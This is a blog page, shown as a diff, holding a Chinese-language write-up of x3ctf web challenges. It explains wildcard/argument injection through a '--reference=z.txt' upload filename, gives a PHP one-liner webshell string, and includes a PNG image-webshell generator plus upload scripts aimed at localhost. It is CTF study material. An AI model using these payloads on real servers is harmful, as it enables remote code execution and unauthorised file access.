@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=5"
+    />
+    <meta name="description" content="submission 复现 | SV 考点居然是通配符注入  写一下之前错误的思路吧：源码审计  这里其实抓住重点就是一个权限问题，&#x2F;uploads&#x2F;和&#x2F;是可以访问的 思路1(不可行): 将文件上传到非uploads&#x2F;下，chmod时不会影响到，但是txt和basename难搞 思路2(不可行): 将文件move到&#x2F;uploads&#x2F;下的一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="x3ctf_2024">
+<meta property="og:url" content="https://kc1zs4.github.io/2025/01/27/x3ctf_2024/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="submission 复现 | SV 考点居然是通配符注入  写一下之前错误的思路吧：源码审计  这里其实抓住重点就是一个权限问题，&#x2F;uploads&#x2F;和&#x2F;是可以访问的 思路1(不可行): 将文件上传到非uploads&#x2F;下，chmod时不会影响到，但是txt和basename难搞 思路2(不可行): 将文件move到&#x2F;uploads&#x2F;下的一">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-01-27T09:52:51.448Z">
+<meta property="article:modified_time" content="2025-01-28T05:38:16.706Z">
+<meta property="article:tag" content="recurrence">
+<meta name="twitter:card" content="summary">    
+    <link
+        rel="shortcut icon"
+        href="/images/favicon.ico"
+    />
+       
+    <link
+        rel="icon"
+        type="image/png"
+        href="/images/favicon-192x192.png"
+        sizes="192x192"
+    />
+       
+    <link
+        rel="apple-touch-icon"
+        sizes="180x180"
+        href="/images/apple-touch-icon.png"
+    />
+      
+    <!-- title -->
+    <title>x3ctf_2024</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Z6JGRC9FT2');
+  </script>
+
+ <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+     
+    <!-- mathjax -->
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/31/Python%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&text=x3ctf_2024"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&title=x3ctf_2024"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&is_video=false&description=x3ctf_2024"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=x3ctf_2024&body=Check out this article: https://kc1zs4.github.io/2025/01/27/x3ctf_2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&title=x3ctf_2024"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&title=x3ctf_2024"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&title=x3ctf_2024"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&title=x3ctf_2024"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&name=x3ctf_2024&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&t=x3ctf_2024"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#submission-%E5%A4%8D%E7%8E%B0-SV"><span class="toc-number">1.</span> <span class="toc-text">submission 复现 | SV</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blogdog-%E5%A4%8D%E7%8E%B0-OPEN"><span class="toc-number">2.</span> <span class="toc-text">blogdog 复现  | OPEN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kittyconvert-%E5%A4%8D%E7%8E%B0-OPEN"><span class="toc-number">3.</span> <span class="toc-text">kittyconvert 复现 | OPEN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">5.</span> <span class="toc-text">Ref</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        x3ctf_2024
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-27T09:52:51.448Z" class="dt-published" itemprop="datePublished">2025-01-27</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/recurrence/" rel="tag">recurrence</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="submission-复现-SV"><a href="#submission-复现-SV" class="headerlink" title="submission 复现 | SV"></a>submission 复现 | SV</h2><ol>
+<li><p>考点居然是通配符注入</p>
+</li>
+<li><p>写一下之前错误的思路吧：源码审计</p>
+<ol>
+<li>这里其实抓住重点就是一个权限问题，&#x2F;uploads&#x2F;和&#x2F;是可以访问的<ol>
+<li>思路1(不可行): 将文件上传到非uploads&#x2F;下，chmod时不会影响到，但是txt和basename难搞</li>
+<li>思路2(不可行): 将文件move到&#x2F;uploads&#x2F;下的一小段时间内还没有chmod，可能可以竞争，不行，而且有txt无法执行</li>
+</ol>
+</li>
+</ol>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$uploadOk</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="variable">$target_dir</span> = <span class="string">&quot;/var/www/html/uploads/&quot;</span>;</span><br><span class="line">  <span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 不能已经存在，phar不了，不可控</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, file already exists.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">50000</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file is too large you need to buy Nitro.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// txt后缀</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">str_ends_with</span>(<span class="variable">$target_file</span>, <span class="string">&#x27;.txt&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Due to exploit you can only upload files with .txt extensions sorry about this but we got hacked last time so we have to check this from now on.&quot;</span>;</span><br><span class="line">    <span class="variable">$uploadOk</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if $uploadOk is set to 0 by an error</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$uploadOk</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file was not uploaded.&quot;</span>;</span><br><span class="line">  <span class="comment">// if everything is ok, try to upload file</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">      <span class="comment">// html转义，防止xss</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span>. <span class="title function_ invoke__">htmlspecialchars</span>( <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])). <span class="string">&quot; has been uploaded.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo &quot;&lt;h1&gt;&quot;.$target_file.&quot;&lt;/h1&gt;&quot;;</span></span><br><span class="line"><span class="variable">$old_path</span> = <span class="title function_ invoke__">getcwd</span>();</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$target_dir</span>);</span><br><span class="line"><span class="comment">// make unreadable</span></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;chmod 000 *&#x27;</span>);  <span class="comment">// 没有权限wc</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$old_path</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>思路3(from wp)</p>
+<ol>
+<li><p><strong>也是从权限入手</strong>：<code>chmode 000 *</code>，这里有通配符注入(好像在v1nd哥那里看过)，似乎在5&#x2F;4字符rce里也有过，通配符注入本质时通配符展开的问题</p>
+</li>
+<li><p>这里也不管命令了，本质上是对flag.txt的提权，涉及到了chmod的提权</p>
+<ol>
+<li><code>chmod --help</code>，发现有一个<code>--reference=RFILE</code>，可以将RFILE的权限复制到FILE，也就这个可以提权的了</li>
+<li>我们还未赋值前的话，上传的文件是可读的，那么将上传的文件赋值到flag.txt就可以了，注意ascii码要在f后</li>
+<li><code>&gt;--reference=z.txt</code>，然后<code>&gt;z.txt</code>，访问即可，执行的命令相当于<code>chmod 000 --reference=z.txt flag.txt z.txt</code></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://localhost:5000&quot;</span></span><br><span class="line">bp = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://localhost:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">### 上传文件</span></span><br><span class="line">path_upload = <span class="string">&quot;/&quot;</span></span><br><span class="line">file_upload = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (</span><br><span class="line">        <span class="comment">### try</span></span><br><span class="line">        <span class="comment"># &quot;../\x00.txt&quot;, open(&quot;kc1zs4.txt&quot;, &quot;rb&quot;), &quot;text/plain&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">### payload: 要按照顺序</span></span><br><span class="line">        <span class="comment"># &quot;--reference=z.txt&quot;, &quot;&quot;, &quot;text/plain&quot;</span></span><br><span class="line">        <span class="string">&quot;z.txt&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;text/plain&quot;</span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">r = session.post(host+path_upload, files=file_upload, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>深入了解bash中的通配符展开</strong></p>
+<ol>
+<li><p>在linux中如bash中shell会尝试将其与当前目录下的文件名进行匹配，并将通配符替换为符合模式的<strong>所有文件名列表</strong></p>
+</li>
+<li><p><strong>命令的本质</strong>: 一系列参数，可以想象一下java main函数的Strings[] args，这里的通配符展开就是将通配符替换为参数，然后传递给命令</p>
+</li>
+<li><p><strong>原理</strong>: 将文件名作为参数，也就是命令了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /tmp/test</span><br><span class="line"><span class="built_in">cd</span> /tmp/test</span><br><span class="line">&gt;-al</span><br><span class="line"><span class="built_in">ls</span> *  <span class="comment"># 执行的是ls -al命令</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>顺序问题</strong></p>
+<ol>
+<li><strong>对于有’和”引号也是ok的</strong>，可以本地先试一下</li>
+<li>在Bash中，通配符展开（Wildcard Expansion）是按照文件名的字典顺序（lexicographical order，也称为字典序或字母顺序）</li>
+<li>字典顺序基于字符的ASCII值来决定顺序</li>
+</ol>
+</li>
+<li><p>常见通配符</p>
+<table>
+<thead>
+<tr>
+<th>通配符</th>
+<th>作用</th>
+<th>例子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>*</td>
+<td>匹配零个或多个字符</td>
+<td>ls *</td>
+</tr>
+<tr>
+<td>?</td>
+<td>匹配单个字符</td>
+<td>ls ?</td>
+</tr>
+<tr>
+<td>[abc]</td>
+<td>匹配方括号内的任意一个字符</td>
+<td>ls [abc]</td>
+</tr>
+<tr>
+<td>[a-z]</td>
+<td>匹配指定范围内的任意一个字符</td>
+<td>ls [a-z]</td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="blogdog-复现-OPEN"><a href="#blogdog-复现-OPEN" class="headerlink" title="blogdog 复现  | OPEN"></a>blogdog 复现  | OPEN</h2><ol>
+<li>一眼就应该是不会的样子emm</li>
+<li>审计一下源码，这里不贴了，有点长<ol>
+<li>留意一下版本信息，可能要打漏洞</li>
+<li>要打xssbot</li>
+<li>用gpt描述一下过程<ol>
+<li>用户提交内容：用户提交了一条包含链接的消息，如 Check out this site: [<a href="https://example.com]">https://example.com]</a>.</li>
+<li>服务器端处理：服务器接收到消息，提取其中的 URL [<a href="https://example.com]，并调用">https://example.com]，并调用</a> xssbot 函数进行检查。</li>
+<li>访问本地服务器：xssbot 函数首先访问本地服务器主页 [<a target="_blank" rel="noopener" href="http://localhost:3000/]%EF%BC%8C%E5%B9%B6%E5%9C%A8%E9%A1%B5%E9%9D%A2%E4%B8%8A%E7%9A%84">http://localhost:3000/]，并在页面上的</a> #flag 输入框中输入预定义的 FLAG 值。</li>
+<li>访问目标 URL：然后，xssbot 函数尝试导航到用户提交的目标 URL [<a href="https://example.com]，并在超时时间内尝试加载该页面。">https://example.com]，并在超时时间内尝试加载该页面。</a></li>
+<li>关闭浏览器：无论是否成功加载目标 URL，都会在 TIMEOUT 毫秒后尝试关闭浏览器，释放系统资源。</li>
+</ol>
+</li>
+<li>没搞懂，白给了，复现好</li>
+</ol>
+</li>
+</ol>
+<h2 id="kittyconvert-复现-OPEN"><a href="#kittyconvert-复现-OPEN" class="headerlink" title="kittyconvert 复现 | OPEN"></a>kittyconvert 复现 | OPEN</h2><ol>
+<li><p>可控的输入有</p>
+<ol>
+<li>上传的文件名，但是又preg_replaec和basename</li>
+<li>文件的内容，感觉难以做手脚，数据清洗？</li>
+<li>应该是要结合这两个方面来处理的</li>
+</ol>
+</li>
+<li><p>文件名绕过</p>
+<ol>
+<li>直接上传<code>.php</code></li>
+<li>尝试写入木马<ol>
+<li><p>会写入_get_icon_data()的内容，emm看了一下，上传一个图片马应该就可以，在data区(数据部分)进行写入一句话木马</p>
+</li>
+<li><p>写入数据段<code>&lt;?$_GET[0]($_POST[1]);?&gt;</code></p>
+<ol>
+<li>从网上抄来的脚本，没有打成功，wp里说是又lsb似乎</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;kc1zs4.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>复现吧</p>
+<ol start="4">
+<li>思路是不难的，主要是这里需要对文件格式进行了解才可以进行构造，emm学习一下</li>
+</ol>
+</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>submission<ul>
+<li><input checked="" disabled="" type="checkbox"> 通配符注入的思维: 展开，参数与文件名，顺序问题(<strong>这题顺序错了也不行，而且如果实战无法重置环境相当于白白浪费了</strong>)</li>
+<li><input checked="" disabled="" type="checkbox"> 抓重点的思维和问题分类: 权限问题，提权</li>
+</ul>
+<ol>
+<li>本来也是有想到从命令入手的，但是只是一念，还是不能快，思路&gt;行动阿，再仔细看一下*知道有**输入(攻击的可能来源于输入)**可能就可以了</li>
+</ol>
+</li>
+<li>blogdog<ol>
+<li>前端题目，几乎没咋见过，有点意思</li>
+</ol>
+<ul>
+<li><input disabled="" type="checkbox"> nonce [<a target="_blank" rel="noopener" href="https://deepinout.com/html/html-questions/398_html_whats_the_purpose_of_the_html_nonce_attribute_for_script_and_style_elements.html]">https://deepinout.com/html/html-questions/398_html_whats_the_purpose_of_the_html_nonce_attribute_for_script_and_style_elements.html]</a></li>
+<li><input disabled="" type="checkbox"> purify.min.js</li>
+<li><input disabled="" type="checkbox"> node项目的项目结构与文件功能</li>
+</ul>
+</li>
+<li>kittyconvert<ul>
+<li><input disabled="" type="checkbox"> 图片马：一些格式的学习</li>
+<li><input disabled="" type="checkbox"> conda源问题</li>
+<li><input disabled="" type="checkbox"> python 重名，还是要package</li>
+</ul>
+</li>
+</ol>
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol>
+<li>[<a target="_blank" rel="noopener" href="https://github.com/x3ctf/challenges-2025/blob/main/web/]">https://github.com/x3ctf/challenges-2025/blob/main/web/]</a></li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#submission-%E5%A4%8D%E7%8E%B0-SV"><span class="toc-number">1.</span> <span class="toc-text">submission 复现 | SV</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blogdog-%E5%A4%8D%E7%8E%B0-OPEN"><span class="toc-number">2.</span> <span class="toc-text">blogdog 复现  | OPEN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kittyconvert-%E5%A4%8D%E7%8E%B0-OPEN"><span class="toc-number">3.</span> <span class="toc-text">kittyconvert 复现 | OPEN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">5.</span> <span class="toc-text">Ref</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2025/01/27/x3ctf_2024/&text=x3ctf_2024"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
